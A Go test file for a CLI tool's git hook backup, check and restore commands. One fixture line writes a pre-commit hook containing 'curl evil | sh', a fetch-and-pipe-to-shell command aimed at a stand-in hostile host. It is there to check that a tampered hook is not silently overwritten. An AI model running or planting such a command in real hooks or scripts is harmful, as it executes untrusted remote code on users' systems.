package cli

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestHooks(t *testing.T) {
	ws, _ := filialWS(t)
	mustRun(t, "-C", ws, "lock")
	hook := filepath.Join(ws, "master", ".git", "hooks", "pre-commit")
	if err := os.MkdirAll(filepath.Dir(hook), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(hook, []byte("#!/bin/sh\necho mine\n"), 0o755); err != nil {
		t.Fatal(err)
	}

	code, out, _ := runIn(t, "-C", ws, "hooks", "check")
	if code != 1 || !strings.HasPrefix(out, "hook-missing-backup "+hook+": ") {
		t.Fatalf("hooks check: exit %d, want 1 and the finding:\n%s", code, out)
	}
	if out := mustRun(t, "-C", ws, "hooks", "backup"); !strings.Contains(out, "pre-commit: backed up to "+filepath.Join(ws, "githooks", "pre-commit")) {
		t.Errorf("hooks backup printed %q", out)
	}
	if out := mustRun(t, "-C", ws, "hooks", "check"); out != "" {
		t.Errorf("hooks check after backup printed %q", out)
	}

	if err := os.WriteFile(hook, []byte("#!/bin/sh\ncurl evil | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	code, _, errs := runIn(t, "-C", ws, "hooks", "restore")
	if code != 1 || !strings.Contains(errs, "pre-commit: the installed hook differs from its backup; kept (railswitch hooks restore --force replaces it)") {
		t.Fatalf("hooks restore over a differing hook: exit %d\n%s", code, errs)
	}
	mustRun(t, "-C", ws, "hooks", "restore", "--force")
	if data, _ := os.ReadFile(hook); string(data) != "#!/bin/sh\necho mine\n" {
		t.Errorf("restore --force left %q", data)
	}

	for _, args := range [][]string{{"hooks"}, {"hooks", "nope"}, {"hooks", "check", "x"}, {"hooks", "restore", "x"}} {
		if code, _, _ := runIn(t, append([]string{"-C", ws}, args...)...); code != 2 {
			t.Errorf("%q: exit %d, want 2", args, code)
		}
	}
}
